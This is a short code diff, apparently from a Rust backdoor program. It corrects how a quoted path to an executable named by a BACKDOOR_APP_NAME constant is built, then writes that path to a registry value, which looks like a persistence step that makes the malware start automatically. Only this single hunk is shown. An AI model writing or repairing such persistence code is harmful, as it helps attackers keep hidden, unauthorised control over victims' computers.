@@ -59,7 +59,7 @@ impl Helper
         }
 
         let current_dir = self.get_current_directory();
-        let current_dir = format!("\"{}\\{}\"", BACKDOOR_APP_NAME, current_dir);
+        let current_dir = format!("\"{}\\{}\"", current_dir, BACKDOOR_APP_NAME);
 
         match regkey.set_value("rozbie", &current_dir)
         {
